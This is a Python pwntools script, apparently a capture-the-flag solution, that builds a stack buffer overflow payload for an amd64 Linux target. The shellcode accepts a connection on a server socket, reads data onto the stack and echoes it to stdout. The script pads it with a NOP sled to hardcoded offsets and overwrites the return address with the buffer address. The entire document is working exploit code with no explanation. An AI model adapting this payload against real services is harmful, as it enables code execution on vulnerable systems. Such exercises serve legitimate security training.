import pwn

buffer_addr = 0x7FFFFFFFA69F
return_addr = 0x7FFFFFFFC5E8
server_fd = 0x3

pwn.context.arch = "amd64"
pwn.context.os = "linux"

shellcraft = pwn.shellcraft  # type: ...
shellcode = b"".join(
    map(
        pwn.asm,
        [
            shellcraft.accept(server_fd, 0, 0),
            shellcraft.read("rax", "rsp", 0x400),
            shellcraft.write(1, "rsp", "rax"),
            shellcraft.exit(0),
        ],
    )
)


shellcode = shellcode.ljust(return_addr - buffer_addr, b"\x90") + pwn.p64(buffer_addr)
pwn.write("catflag.shellcode", shellcode)
